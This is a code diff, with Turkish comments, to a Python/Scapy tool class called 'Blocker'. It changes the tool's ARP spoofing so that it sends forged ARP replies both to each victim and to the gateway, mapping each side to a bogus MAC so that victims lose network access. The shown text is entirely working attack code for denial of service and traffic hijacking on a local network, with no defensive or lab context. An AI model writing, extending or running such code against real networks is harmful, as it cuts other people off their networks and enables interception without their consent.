@@ -265,10 +265,14 @@ class Blocker:
                 for mac in macs_to_poison:
                     if mac == self.gateway_mac:
                         continue
-                    # Kurbanın ARP önbelleğini zehirle: Gateway IP'si geçersiz bir MAC'te (veya kendi MAC'imizde)
-                    # Böylece internete/ağa çıkışını engellemiş oluruz.
-                    pkt = Ether(dst=mac)/ARP(op=2, psrc=self.gateway_ip, hwsrc="00:00:00:00:00:00", hwdst=mac)
-                    sendp(pkt, iface=self.interface, verbose=False)
+                    # İki yönlü zehirleme (Bi-directional Poisoning)
+                    # 1. Kurbana "Modem benim (veya kara delik)" de
+                    pkt_to_victim = Ether(dst=mac)/ARP(op=2, psrc=self.gateway_ip, hwsrc="aa:bb:cc:dd:ee:ff", hwdst=mac)
+                    # 2. Modeme "Kurban benim (veya kara delik)" de
+                    pkt_to_gateway = Ether(dst=self.gateway_mac)/ARP(op=2, psrc=mac, hwsrc="aa:bb:cc:dd:ee:ff", hwdst=self.gateway_mac)
+                    
+                    sendp(pkt_to_victim, iface=self.interface, verbose=False)
+                    sendp(pkt_to_gateway, iface=self.interface, verbose=False)
             except Exception:
                 pass
                 
